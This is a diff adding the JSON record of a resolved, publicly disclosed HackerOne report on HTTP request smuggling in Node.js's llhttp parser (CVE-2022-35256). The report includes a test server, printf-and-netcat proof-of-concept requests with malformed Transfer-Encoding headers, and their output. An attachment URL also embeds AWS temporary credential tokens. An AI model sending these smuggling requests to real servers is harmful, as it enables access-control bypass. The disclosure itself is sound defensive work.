@@ -1,0 +1,130 @@
+{
+  "id": 1675191,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjc1MTkx",
+  "url": "https://hackerone.com/reports/1675191",
+  "title": "HTTP Request Smuggling Due to Incorrect Parsing of Header Fields",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-20T03:13:30.448Z",
+  "submitted_at": "2022-08-20T03:13:30.523Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vvx7",
+    "url": "/vvx7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bbv64gp7idz3ugwd7gidfhbjqds2/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-35256"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-10-26T08:17:59.080Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-26T08:17:52.067Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.\n\n**Description:** \nThe following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.\n\nA header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. \n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\nThe request is rejected when the preceding header has a value but improper CLRF.\n```\nPOST / HTTP/1.1\nHost: localhost:5000\nx:x\\nTransfer-Encoding: chunked\n\n1\nA\n0\n\n```\n\n## Steps To Reproduce:\n\nServer\nRun the server: `node app.js`\n\n```js\n// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/\nconst http = require('http');\n\nhttp.createServer((request, response) => {\n  let body = [];\n  request.on('error', (err) => {\n    response.end(\"Request Error: \" + err)\n  }).on('data', (chunk) => {\n        body.push(chunk);\n  }).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    // log the body to stdout to catch the smuggled request\n    console.log(\"Response\");\n    console.log(request.headers);\n    console.log(body);\n    console.log(\"---\");\n\n    response.on('error', (err) => {\n      // log the body to stdout to catch the smuggled request\n        response.end(\"Response Error: \" + err)\n    });\n\n    response.end(\"Body length: \" + body.length.toString() + \" Body: \" + body);\n  });\n}).listen(5000);\n```\nPayload\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" x:\\nTransfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nOutput\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 02:59:38 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\n```\nNote:\n```bash\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n\"Host: localhost\\r\\n\"\\\n\" Transfer-Encoding: yeet\\r\\n\"\\\n\" Transfer-Encoding: \\n\"\\\n\" Transfer-Encoding: chunked\\r\\n\"\\\n\"\\r\\n\"\\\n\"1\\r\\n\"\\\n\"A\\r\\n\"\\\n\"0\\r\\n\"\\\n\"\\r\\n\" | nc localhost 5000\n```\nThis also works with the resulting wonky header:\n```\nHTTP/1.1 200 OK\nDate: Sat, 20 Aug 2022 03:06:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\nContent-Length: 22\n\nBody length: 1 Body: A\nResponse\n{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }\nA\n```\n\n## Impact:\n\nHRS can lead to access control bypass and other issues.\n\n## Supporting Material/References:\n{F1875064}\n\n\nhttps://hackerone.com/reports/1501679\nhttps://hackerone.com/reports/1238709\n\n## Impact\n\nHTTP Request Smuggling can lead to access control bypass.",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1875062,
+      "file_name": "CleanShot_2022-08-19_at_23.09.24.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/85anhamky7182hac48d4ssjopg7m?response-content-disposition=attachment%3B%20filename%3D%22CleanShot_2022-08-19_at_23.09.24.png%22%3B%20filename%2A%3DUTF-8%27%27CleanShot_2022-08-19_at_23.09.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T214432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1cfb8eec817453f081e432f04e566f4e17d4decebc09ecdbcb6f68609226eed6",
+      "file_size": 195811,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-10-26T08:17:52.185Z",
+  "allow_singular_disclosure_after": -104851600.43880992,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "shreyaschavhan",
+    "ttmachine",
+    "shivammusic",
+    "cyb3rkid4u",
+    "fatalis",
+    "azdpsi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
